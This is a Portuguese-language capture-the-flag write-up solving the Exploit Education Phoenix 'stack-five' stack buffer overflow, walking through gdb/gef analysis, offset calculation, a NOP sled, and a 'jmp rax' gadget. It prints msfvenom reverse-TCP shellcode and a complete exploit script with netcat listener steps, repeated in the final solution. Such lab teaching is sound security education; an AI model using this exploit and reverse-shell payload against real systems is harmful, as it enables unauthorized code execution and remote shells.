# üéØ Objetivo
Finalmente! Tudo isso para chegar no BOF SRP (classico) :D

Agora ta na hora de redirecionar o pointer para o nosso codigo malicioso (shellcode) para ganhar uma shell 
# üí° Dicas
A instru√ß√£o "0xCC" serve para o debugger (como o gdb ou o do VsCode), quando a o rip chega nela a execu√ß√£o pausa. Nos podemos usa-la para testar se conseguimos 
executar codigo, ou se o problema ta no shellcode: Se o debugger avisa que teve "SIGTRAP", nos temos execu√ß√£o de c√≥digo :D

Banco de dados de shellcode: [shell-storm](http://shell-storm.org/shellcode/files/)
# üî• Exploit
## Analisando o programa
main() printa o banner e chama start_level()

start_level(rbp-0x80) cria um buffer[**128**] e salva o output de gets() (**inseguro**)

Como voc√™ pode ver, n√£o exite comple_level()

Para completar, precisamos executar nosso pr√≥prio codigo (shellcode) e conseguir uma shell (uma linha de comando)
## Agora em ASM :D (analise estatica)
Primeiro, vamos ver main
```
gef> disassemble main
   0x00000000004005a4 <+0>:	push   rbp
   0x00000000004005a5 <+1>:	mov    rbp,rsp                       <- Prologo
   0x00000000004005a8 <+4>:	sub    rsp,0x10
   
   
   0x00000000004005ac <+8>:	mov    DWORD PTR [rbp-0x4],edi
   0x00000000004005af <+11>:	mov    QWORD PTR [rbp-0x10],rsi   <- args de puts
   0x00000000004005b3 <+15>:	mov    edi,0x400620
   0x00000000004005b8 <+20>:	call   0x400400 <puts@plt>        <- call puts
   
   
   0x00000000004005bd <+25>:	mov    eax,0x0                    <- args de start_level (nenhum)
   0x00000000004005c2 <+30>:	call   0x40058d <start_level>     <- call start_level
   
   
   0x00000000004005c7 <+35>:	mov    eax,0x0                    <- exit code (codigo de saida, 0=sem erro)
   0x00000000004005cc <+40>:	leave                             <- Epilogo
   0x00000000004005cd <+41>:	ret    
```
Agora vamos ver start_level
```
gef> disassemble start_level 
   0x000000000040058d <+0>:	push   rbp
   0x000000000040058e <+1>:	mov    rbp,rsp                  <- Prologo 
   0x0000000000400591 <+4>:	add    rsp,0xffffffffffffff80   <- Ignora esse ADD para n√£o se confundir,
                                                                  Normalmente usa SUB para alocar espa√ßo na stack
   
   
   0x0000000000400595 <+8>:	lea    rax,[rbp-0x80]         <- rax = Pointer para buffer[128]
   0x0000000000400599 <+12>:	mov    rdi,rax                <- rdi = rax
   0x000000000040059c <+15>:	call   0x4003f0 <gets@plt>    <- call gets
   
   
   0x00000000004005a1 <+20>:	nop
   0x00000000004005a2 <+21>:	leave                         <- Epilogo
   0x00000000004005a3 <+22>:	ret    
```
Agora vamos adicionar um breakpoint!
> Breakpoint = ponto de pausa
>
> Antes daquela intru√ß√£o ser executada, sera substituida por 0xCC. Isso faz o  debugger pausar a execu√ß√£o do programa naquela instru√ß√£o!
> Quando continuamos executando (normalmente o comando √© **continue**), o 0xCC √© substituido pela instru√ß√£o certa :D
> 
> Se voc√™ esta fora de um debugger, 0xCC vai fazer o programa sair com erro
```
gef> b *0x000000000040059c
Breakpoint 1 at 0x40059c

"b" √© o comando do gdb para adionar um breakpoint
A "*" tem haver com aquele role dos pointers
O endere√ßo √© para a "call gets" (olha la em cima)
```
> Dica: se voc√™ selecionar/sublinhar (clique esquerdo e passa o mouse em cima, voc√™ sabe do que eu to falando), e clicar o bot√£o do meio no mouse (a rodinha) 
> o terminal automaticamente da Ctrl-C Ctrl-V naquele valor para voc√™! Ent√£o n√£o precisa copiar o endere√ßo manualmente :D

## Agora vamos executar o programa (analise dinamica)
126 As n√£o causam erro, e 127 As causam... ue, mas pq? n√£o era pra dar erro s√≥ em 128?
```
user@phoenix-amd64:/opt/phoenix/amd64$ python3 -c "print('A'*126)" | ./stack-five 
Welcome to phoenix/stack-five, brought to you by https://exploit.education

user@phoenix-amd64:/opt/phoenix/amd64$ python3 -c "print('A'*127)" | ./stack-five 
Welcome to phoenix/stack-five, brought to you by https://exploit.education
Segmentation fault
```
Isso vai ser muito importante no pr√≥ximo: buffers s√£o terminados com um null byte!

Ent√£o pq eu to te ensinando isso agora? Resposta: S√≥ por curiosidade!

S√≥ que mais importantemente, isso nos mostra que o compilador n√£o adicionou nada no meio do caminho entre o buffer e o EBP+EIP Salvos :D

E n√≥s ja sabemos como controlar o EIP, ent√£o agora s√≥ precisamos saber para onde redirecionar a execu√ß√£o :)

## Encontrar endere√ßo do buffer

Agora dentro do gdb (**gdb stack-five**)
> gef> r <<< $(python3 -c "print('A'*100)")
> 
> r √© o comand do gdb para rodar o programa!
>  Adicionando "<<<" n√≥s podemos mandar uma string pro input! Tambem funciona com arquivos ( r < nome_do_arquivo ) :D

```
gef> r <<< $(python3 -c "print('A'*100)")
Starting program: /opt/phoenix/amd64/stack-five <<< $(python3 -c "print('A'*100)")
Welcome to phoenix/stack-five, brought to you by https://exploit.education

Breakpoint 1, 0x000000000040059c in start_level ()

--- Output do gef ---
--- gef √© uma extens√£o do gdb que vai te dar um monte de informa√ß√£o util quando voc√™ chega num breakpoint ---
```
O output do gef contem:
![](https://raw.githubusercontent.com/0xturazzi/Writeups/master/ExploitEducation-Phoenix-PT-BR-%20%F0%9F%87%A7%F0%9F%87%B7/img/gef_example.png)
Porem, mais informa√ß√µes podem ser adicionadas! use `gef help` para ver como ele pode te ajudar :D 

Caso o programa seja executado sem breakpoints e com muitos As, vamos receber uma SIGSEV informando que "$PC"(outro nome para RIP) n√£o pode ser redirecionado para "41414141", confirmando que o nosso buffer overflow √© possivel (olha as linhas no final da segunda imagem)
![](https://raw.githubusercontent.com/0xturazzi/Writeups/master/ExploitEducation-Phoenix-PT-BR-%20%F0%9F%87%A7%F0%9F%87%B7/img/stack%20five/gef_A_overflow_0.png)
![](https://raw.githubusercontent.com/0xturazzi/Writeups/master/ExploitEducation-Phoenix-PT-BR-%20%F0%9F%87%A7%F0%9F%87%B7/img/stack%20five/gef_A_overflow_1.png)

Agora, vamos colocar o breakpoint em `call gets()` e executar o programa com 140 As
![](https://raw.githubusercontent.com/0xturazzi/Writeups/master/ExploitEducation-Phoenix-PT-BR-%20%F0%9F%87%A7%F0%9F%87%B7/img/stack%20five/before_gets_0.png)

As partes importante no output do gef s√£o:

registers
![](https://raw.githubusercontent.com/0xturazzi/Writeups/master/ExploitEducation-Phoenix-PT-BR-%20%F0%9F%87%A7%F0%9F%87%B7/img/stack%20five/before_gets_3.png)

argumentos (vazio: o pointer em RDI aponta para **0x00007fffffffe5b0**, que possui o valor 0x0000...,)
![](https://raw.githubusercontent.com/0xturazzi/Writeups/master/ExploitEducation-Phoenix-PT-BR-%20%F0%9F%87%A7%F0%9F%87%B7/img/stack%20five/before_gets_1.png)

> Lembrete de que pointer come√ßa com 2 NULL bytes ai :D

stack
![](https://raw.githubusercontent.com/0xturazzi/Writeups/master/ExploitEducation-Phoenix-PT-BR-%20%F0%9F%87%A7%F0%9F%87%B7/img/stack%20five/before_gets_2.png)

Voc√™ tambem acha que tem uma falta de AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ?? hehehe :P

Ent√£o vamos avan√ßar para pr√≥xima intru√ß√£o (step: `s`) :D
![](https://raw.githubusercontent.com/0xturazzi/Writeups/master/ExploitEducation-Phoenix-PT-BR-%20%F0%9F%87%A7%F0%9F%87%B7/img/stack%20five/gef_after_gets_0.png)

Ah, assim que eu gosto XD

Isso quer dizer que aquele pointer dos argumentos agora aponta para os As, ne? Sim! :D
```
gef> x/s 0x00007fffffffe5b0              -> x/s √© o comando para printar strings
0x7fffffffe5b0:	'A' <repete 140 vezes>
``` 
Ent√£o nos ja temos o endere√ßo dos nossos As :D ... que em breve ser√£o codigo :D

Mas agora precisamos saber com presi√ß√£o quantos As at√© o RIP, `info frame` vai nos ajudar com isso:
```
gef> info frame
Stack level 0, frame at 0x7fffffffe640:
 rip = 0x4005a1 in start_level; saved rip = 0x4005c7
 called by frame at 0x7fffffffe610
 Arglist at 0x7fffffffe630, args: 
 Locals at 0x7fffffffe630, Previous frame's sp is 0x7fffffffe640
 Saved registers:
  rbp at 0x7fffffffe630, rip at 0x7fffffffe638
```

RIP em: 0x7fffffffe638
```
kali@kali:~$ python3
>>> 0x7fffffffe638 - 0x00007fffffffe5b0
136
```

Para confirmar isso, vamos rodar com 136 As + BBBB

![](https://raw.githubusercontent.com/0xturazzi/Writeups/master/ExploitEducation-Phoenix-PT-BR-%20%F0%9F%87%A7%F0%9F%87%B7/img/stack%20five/gef_136A_BBBB.png)

## NOP sled
Entretando, como nada pode ser simples nesse mundo do desenvolvimento de exploits, n√≥s n√£o conseguimos saber com precis√£o que o buffer vai estar l√° :(

Isso ocorre pois as envs s√£o alocadas na stack. E elas variam muito, por exemplo, s√≥ de mudar o local de onde o programa esta sendo executado quebraria o nosso exploit.
> Dica: O gef pode nos ajudar a encontra-las
![](https://raw.githubusercontent.com/0xturazzi/Writeups/master/ExploitEducation-Phoenix-PT-BR-%20%F0%9F%87%A7%F0%9F%87%B7/img/stack%20five/gef_envs_1.png)

Por exemplo:

![](https://raw.githubusercontent.com/0xturazzi/Writeups/master/ExploitEducation-Phoenix-PT-BR-%20%F0%9F%87%A7%F0%9F%87%B7/img/stack%20five/gef_envs_0.png)

Para remediar isso, podemos usar um NOP sled (ou NOP slide) ! :D

NOP significa "**No** **OP**eration" (**N**enhuma **OP**era√ß√£o) ! √© uma instru√ß√£o que n√£o faz nada :D

A representa√ß√£o em machine code do NOP √© 0x90 :D Bem f√°cil de decorar, quem me dera escola fosse f√°cil assim hehehe :)

O processador vai fazer nada e passar para a pr√≥xima, e se n√≥s colocarmos varios desses em sequencia, o RIP vai "deslizando" atrav√©s at√© chegar no nosso c√≥digo!

Voc√™ pode imaginar um escorregador :D yuuuuupiii

![](https://raw.githubusercontent.com/0xturazzi/Writeups/master/ExploitEducation-Phoenix-PT-BR-%20%F0%9F%87%A7%F0%9F%87%B7/img/panda_slide_1.gif)

Ent√£o a gente redireciona o RIP para o meio do escorregador de NOPs, para ele delizar at√© o nosso c√≥digo :D

Assim, mesmo se o buffer estiverem em um endere√ßo diferente, o RIP vai chegar no nosso shellcode

Para testar isso, vamos usar o truque do 0xCC mencionado anteriormente

O input que vai passar vai conter:

```
NOP * 135
0xCC
Ender√ßo para ser colocado no RIP: 0x00007fffffffe5b0 + 70
```
E os breakpoints do gdb ser√£o removidos, ent√£o caso encontremos um breakpoint, foi o 0xCC acima

O endere√ßo colcado ser√° no meio do slide, e n√£o no inicio: n√≥s b√£o sabemos se a diferen√ßa no endere√ßo vai ser para cima ou pra baixo!
```
$ python3
>>> hex(0x00007fffffffe5b0 + 70)
'0x7fffffffe5f6'                     - Little Endian -> '\xb6\xe5\xff\xff\xff\x7f'
```
Agora executando:
```
r <<< $(python -c "print '\x90' *135 + '\xcc' +'\xb6\xe5\xff\xff\xff\x7f'")
```
Nos recebemos uma SIGTRAP (chegou no breakpoint)
```
[#0] Id 1, Name: "stack-five", stopped, reason: SIGTRAP
```
E na se√ß√£o `code` do gef
![](https://raw.githubusercontent.com/0xturazzi/Writeups/master/ExploitEducation-Phoenix-PT-BR-%20%F0%9F%87%A7%F0%9F%87%B7/img/stack%20five/gef_run_xCC.png)

> int3 √© o nome de 0xCC, da mesma maneira que NOP √© o nome de 0x90 

Apos a nossa ultima intru√ß√£o ha intru√ß√µes invalidas `(bad)` que eram o nosso pointer, e logo em seguida o resto do programa normal! :D

## Shellcode

Shellcode √© o codigo malicioso que vai ser executado ( normalmente te dando uma shell (terminal) n√£o autorizada )

Nos podemos usar os do link citado na dica, ou gerar uma usando msfvenom (ja vem instalado no kali linux)

> msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 --platform linux -a x64 -f python --var-name buf

```
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of python file: 373 bytes
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
buf += b"\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48"
buf += b"\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"
buf += b"\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58"
buf += b"\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48"
buf += b"\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"


```

Agora, vamos fazer um exploit mais bem feito! `vim /tmp/exploit.py`
```
buf =  b""

# shellcode
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
buf += b"\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48"
buf += b"\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"
buf += b"\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58"
buf += b"\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48"
buf += b"\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"

# NOP Sled para completar o resto do tamanho
buf = '\x90'*(136-len(buf)) + buf

# ret
buf += b'\xb6\xe5\xff\xff\xff\x7f'


open("/tmp/exploit","wb").write(buf)
```

> O script /tmp/exploit.py vai gerar o que colocariamos no input, mas ao enves de printarmos para o terminal, vamos salvar em um arquivo binario (por isso o "wb" no open)! Depois √© s√≥ ler esse arquivo e redireciona-lo `cat /tmp/exploit | ./stack-five` (perceba que n√£o `.py`, caso voc√™ queira, pode dar um nome menos confuso ;) )

Porem, se tentamos executar esse exploit, recebemos SIGSEV: viola√ß√£o de segmento

Teoricamente, era para esse ser o final! Mas por conta de  __" alguma nuancia/algum bug "__  nesse exemplo, n√£o conseguimos completar normalmente! Que azar :(

## Corrigindo o problema
Nessa eu tambem empaquei, e a solu√ß√£o veio daqui: [blog lamarranet](https://blog.lamarranet.com/index.php/exploit-education-phoenix-stack-five-solution/)

Ent√£o valeu pela ajuda :D

Ao enves de colocar o endere√ßo do buffer diretamente no RIP, vamos achar algo que aponte para ele: um `jmp esp` por exemplo

E o beneficio √© que, por estarmos pulando para uma parte estatica, e usando-a para redirecionar para o buffer, n√£o corremos o risco do buffer mudar de endere√ßo!

Isso quer dizer que n√£o precisamos mais do NOP slide :D 

Essa √© uma tecnica chamada programa√ß√£o ROP, que sera discutida em tutoriais futuros :D  Mas o que voc√™ precisa saber por enquanto √© que cada um desses `jmps` √© chamado de **gadget**

Gadgets s√£o instru√ß√µes em outras partes do programa, que s√£o reaproveitadas por nos. Geralmente executar algo e pular para outro gadget!

Para achar esse jmp que nos ajudaria, podemos usar uma ferramenta chamda `ROPgadget`
```
user@phoenix-amd64:/opt/phoenix/amd64$ ROPgadget --binary stack-five --only "jmp"
Gadgets information
============================================================
0x0000000000400481 : jmp rax

Unique gadgets found: 1
```

Isso quer dizer que, ao pular para esse endere√ßo, vamos executar `jmp rax` e acabar pulando para rax! e para onde rax aponta?

Colocando um break antes do ret de start_level, podemos ver que antes de retornar, rax aponta para o mesmo endere√ßo que rsp, e convenientemente o incio do nosso buffer
![](https://raw.githubusercontent.com/0xturazzi/Writeups/master/ExploitEducation-Phoenix-PT-BR-%20%F0%9F%87%A7%F0%9F%87%B7/img/stack%20five/gef_rax.png)

Ent√£o vamos modificar o exploit :D
```
Dica: Shellcode+AAAAA+ret, Little Endian, 136 bytes ate RIP

Se voc√™ n√£o quiser ver a solu√ß√£o enquanto tenta!
.
.
.
.
.
.
.
.
.
.
.
```


```
buf =  ""

# shellcode
buf += "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
buf += "\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48"
buf += "\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"
buf += "\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58"
buf += "\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48"
buf += "\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"

# Filler
buf += 'A' * (136 - len(buf))

# ret
buf += '\x81\x04\x40'

open("/tmp/exploit","wb").write(buf)
```
> Eu removi o **b""** pq tava dando problema :(

Agora basta gerar o exploit: `python /tmp/exploit.py`

Abrir um novo terminal: `ssh -p 2222 user@localhost`

Terminal 1: `nc -lvnp 4444`

Terminal 2: `cat /tmp/exploit | ./stack-five` 

Agora, no terminal 1 deve ter uma shell :D

![](https://raw.githubusercontent.com/0xturazzi/Writeups/master/ExploitEducation-Phoenix-PT-BR-%20%F0%9F%87%A7%F0%9F%87%B7/img/stack%20five/Exploit_working.png)

> Dica: `bash -ip` vai deixar a sua shell mais usavel

Se nos tivessemos executado o programa como root, a nossa shell teria esses privilegios elevados ! :D

![](https://raw.githubusercontent.com/0xturazzi/Writeups/master/ExploitEducation-Phoenix-PT-BR-%20%F0%9F%87%A7%F0%9F%87%B7/img/stack%20five/root_exploit.png)

`UID = 0` quer dizer que possuimos privilegios de root, mesmo que o `whoami` n√£o tenha dito root

E se o programa estivesse exposto para a rede, poderiamos conseguir uma root shell remota :D (spoiler para os proximos desafios hehehe)

---

Voc√™ chegou at√© aqui :D

Toma mais um gif de panda como presente

![](https://raw.githubusercontent.com/0xturazzi/Writeups/master/ExploitEducation-Phoenix-PT-BR-%20%F0%9F%87%A7%F0%9F%87%B7/img/panda_slide_0.gif)

# üí´ Solu√ß√£o

> vim /tmp/exploit.py
```
buf =  ""

# shellcode
buf += "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
buf += "\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48"
buf += "\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"
buf += "\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58"
buf += "\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48"
buf += "\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"

# Filler
buf += 'A' * (136 - len(buf))

# ret
buf += '\x81\x04\x40'

open("/tmp/exploit","wb").write(buf)
```

Agora basta gerar o exploit: `python /tmp/exploit.py`

Abrir um novo terminal: `ssh -p 2222 user@localhost`

Terminal 1: `nc -lvnp 4444`

Terminal 2: `cat /tmp/exploit | ./stack-five` 

Agora, no terminal 1 deve ter uma shell :D

